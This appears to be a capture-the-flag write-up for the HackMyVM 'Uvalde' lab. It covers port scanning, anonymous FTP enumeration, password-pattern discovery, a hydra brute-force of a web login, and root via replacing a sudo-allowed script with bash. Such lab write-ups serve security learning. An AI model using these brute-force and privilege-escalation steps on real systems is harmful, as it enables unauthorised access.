---
layout: post
title: "HackMyVM - Uvalde"
date: 2023-04-03 15:47:00 +0100
categories: hmv
---

Creator: [cromiphi](https://hackmyvm.eu/profile/?user=cromiphi)
Level: Easy
Release Date: 2023-02-17

## Scan

```bash
$ nmap -sC -sV -oA scans/Uvalde -p- $IP
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-03 23:51 WEST
Nmap scan report for uvalde.hmv (192.168.1.23)
Host is up (0.00036s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 1000     1000         5154 Jan 28 20:54 output
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.1.6
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 3a09a4dad7db99eea55105e9afe70890 (RSA)
|   256 cb426abe22132cf257f980d1f7fb885c (ECDSA)
|_  256 443cb40faac394fa231519e3e5185694 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Agency - Start Bootstrap Theme
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.05 seconds
```

## Enumeration

### FTP

```bash
$ ftp 192.168.1.23
Connected to 192.168.1.23.
220 (vsFTPd 3.0.3)
Name (192.168.1.23:adok): ftp
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||17442|)
150 Here comes the directory listing.
drwxr-xr-x    2 0        116          4096 Jan 28 20:55 .
drwxr-xr-x    2 0        116          4096 Jan 28 20:55 ..
-rw-r--r--    1 1000     1000         5154 Jan 28 20:54 output
226 Directory send OK.
ftp> get output
local: output remote: output
229 Entering Extended Passive Mode (|||25499|)
150 Opening BINARY mode data connection for output (5154 bytes).
100% |**************************************************************************************************************************|  5154        1.57 MiB/s    00:00 ETA
226 Transfer complete.
5154 bytes received in 00:00 (1.13 MiB/s)
ftp> exit
221 Goodbye.
```

```bash
$ cat output                      
Script démarré sur 2023-01-28 19:54:05+01:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="105" LINES="25"]
matthew@debian:~$ id
uid=1000(matthew) gid=1000(matthew) groupes=1000(matthew)
matthew@debian:~$ ls -al
total 32
drwxr-xr-x 4 matthew matthew 4096 28 janv. 19:54 .
drwxr-xr-x 3 root    root    4096 23 janv. 07:52 ..
lrwxrwxrwx 1 root    root       9 23 janv. 07:53 .bash_history -> /dev/null
-rw-r--r-- 1 matthew matthew  220 23 janv. 07:51 .bash_logout
-rw-r--r-- 1 matthew matthew 3526 23 janv. 07:51 .bashrc
drwx------ 3 matthew matthew 4096 23 janv. 08:04 .config
drwxr-xr-x 3 matthew matthew 4096 23 janv. 08:04 .local
-rw-r--r-- 1 matthew matthew  807 23 janv. 07:51 .profile
-rw-r--r-- 1 matthew matthew    0 28 janv. 19:54 typescript
-rwx------ 1 matthew matthew   33 23 janv. 07:53 user.txt
matthew@debian:~$ toilet -f mono12 -F metal hackmyvm.eu
                                                                                
 ▄▄                            ▄▄                                               
 ██                            ██                                               
 ██▄████▄   ▄█████▄   ▄█████▄  ██ ▄██▀   ████▄██▄  ▀██  ███  ██▄  ▄██  ████▄██▄ 
 ██▀   ██   ▀ ▄▄▄██  ██▀    ▀  ██▄██     ██ ██ ██   ██▄ ██    ██  ██   ██ ██ ██ 
 ██    ██  ▄██▀▀▀██  ██        ██▀██▄    ██ ██ ██    ████▀    ▀█▄▄█▀   ██ ██ ██ 
 ██    ██  ██▄▄▄███  ▀██▄▄▄▄█  ██  ▀█▄   ██ ██ ██     ███      ████    ██ ██ ██ 
 ▀▀    ▀▀   ▀▀▀▀ ▀▀    ▀▀▀▀▀   ▀▀   ▀▀▀  ▀▀ ▀▀ ▀▀     ██        ▀▀     ▀▀ ▀▀ ▀▀ 
                                                    ███                         
                                                                                
                                                                                
                                                                                
                                                                                
            ▄████▄   ██    ██                                                   
           ██▄▄▄▄██  ██    ██                                                   
           ██▀▀▀▀▀▀  ██    ██                                                   
    ██     ▀██▄▄▄▄█  ██▄▄▄███                                                   
    ▀▀       ▀▀▀▀▀    ▀▀▀▀ ▀▀                                                   
                                                                                
                                                                                
matthew@debian:~$ exit
exit

Script terminé sur 2023-01-28 19:54:37+01:00 [COMMAND_EXIT_CODE="0"]
```

* Credentials: matthew

### Webpage Enumeration

```bash
$ gobuster dir -u http://$IP/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,.html,txt    
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.1.23/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              php,html,txt
[+] Timeout:                 10s
===============================================================
2023/04/04 00:24:41 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/.php                 (Status: 403) [Size: 277]
/index.php            (Status: 200) [Size: 29604]
/img                  (Status: 301) [Size: 310] [--> http://192.168.1.23/img/]
/login.php            (Status: 200) [Size: 1022]
/user.php             (Status: 302) [Size: 0] [--> login.php]
/mail                 (Status: 301) [Size: 311] [--> http://192.168.1.23/mail/]
/css                  (Status: 301) [Size: 310] [--> http://192.168.1.23/css/]
/js                   (Status: 301) [Size: 309] [--> http://192.168.1.23/js/]
/success.php          (Status: 302) [Size: 0] [--> login.php]
/vendor               (Status: 301) [Size: 313] [--> http://192.168.1.23/vendor/]
/create_account.php   (Status: 200) [Size: 1003]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 881494 / 882244 (99.91%)
===============================================================
2023/04/04 00:28:36 Finished
===============================================================
```

```http
POST /create_account.php HTTP/1.1
Host: 192.168.1.23
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 13
Origin: http://192.168.1.23
Connection: close
Referer: http://192.168.1.23/create_account.php
Cookie: PHPSESSID=sagmenh1m4hgcu5rgjlto50jem
Upgrade-Insecure-Requests: 1

username=adok

```

* Response

```bash
$ echo "dXNlcm5hbWU9YWRvayZwYXNzd29yZD1hZG9rMjAyM0AxMjM3" | base64 -d                
username=adok&password=adok2023@1237
```

USER + 2023 + @ (RANDOM)

## Cracking User (matthew)

```bash
$ crunch 16 16 -t matthew2023@%%%% -l aaaaaaaaaaa@aaaa > matth.list
Crunch will now generate the following amount of data: 170000 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 10000
```

```bash
$ hydra -l matthew -P matth.list $IP http-post-form '/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">' 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-04-04 18:51:45
[DATA] max 16 tasks per 1 server, overall 16 tasks, 10000 login tries (l:1/p:10000), ~625 tries per task
[DATA] attacking http-post-form://192.168.1.23:80/login.php:username=matthew&password=^PASS^:<input type="submit" value="Login">
[80][http-post-form] host: 192.168.1.23   login: matthew   password: matthew2023@1554
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-04-04 18:52:07
```

## SSH

```bash
$ ssh matthew@192.168.1.23                                     
Linux uvalde.hmv 5.10.0-20-amd64 #1 SMP Debian 5.10.158-2 (2022-12-13) x86_64
matthew@uvalde:~$ 
```

## Root

```bash
matthew@uvalde:~$ sudo -l
Matching Defaults entries for matthew on uvalde:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User matthew may run the following commands on uvalde:
    (ALL : ALL) NOPASSWD: /bin/bash /opt/superhack
matthew@uvalde:~$ file /opt/superhack
/opt/superhack: Bourne-Again shell script, ASCII text executable
matthew@uvalde:~$ cat /opt/superhack
#! /bin/bash 
clear -x

GRAS=$(tput bold)
JAUNE=$(tput setaf 3)$GRAS
BLANC=$(tput setaf 7)$GRAS
BLEU=$(tput setaf 4)$GRAS
VERT=$(tput setaf 2)$GRAS
ROUGE=$(tput setaf 1)$GRAS
RESET=$(tput sgr0)

cat << EOL


 _______  __   __  _______  _______  ______    __   __  _______  _______  ___   _ 
|       ||  | |  ||       ||       ||    _ |  |  | |  ||   _   ||       ||   | | |
|  _____||  | |  ||    _  ||    ___||   | ||  |  |_|  ||  |_|  ||       ||   |_| |
| |_____ |  |_|  ||   |_| ||   |___ |   |_||_ |       ||       ||       ||      _|
|_____  ||       ||    ___||    ___||    __  ||       ||       ||      _||     |_ 
 _____| ||       ||   |    |   |___ |   |  | ||   _   ||   _   ||     |_ |    _  |
|_______||_______||___|    |_______||___|  |_||__| |__||__| |__||_______||___| |_|



EOL


printf "${BLANC}Tool:${RESET} ${BLEU}superHack${RESET}\n"
printf "${BLANC}Author:${RESET} ${BLEU}hackerman${RESET}\n"
printf "${BLANC}Version:${RESET} ${BLEU}1.0${RESET}\n"

printf "\n"

[[ $# -ne 0 ]] && echo -e "${BLEU}Usage:${RESET} $0 domain" && exit

while [ -z "$domain" ]; do
read -p "${VERT}domain to hack:${RESET} " domain
done

printf "\n"

n=50

string=""
for ((i=0; i<$n; i++))
do
string+="."
done

for ((i=0; i<$n; i++))
do
string="${string/./#}"
printf "${BLANC}Hacking progress...:${RESET} ${BLANC}[$string]${RESET}\r"
sleep .09
done

printf "\n"
printf "${JAUNE}Target $domain ====> PWNED${RESET}\n"
printf "${JAUNE}URL: https://$domain/*********************.php${RESET}\n"

echo -e "\n${ROUGE}Pay 0.000047 BTC to 3FZbgi29cpjq2GjdwV8eyHuJJnkLtktZc5 to unlock backdoor.${RESET}\n"
matthew@uvalde:~$
```

```bash
matthew@uvalde:/opt$ mv superhack superhack.bk
matthew@uvalde:/opt$ echo "bash" > superhack
matthew@uvalde:/opt$ sudo /bin/bash /opt/superhack
root@uvalde:/opt# id
uid=0(root) gid=0(root) groups=0(root)
root@uvalde:/opt# 
```
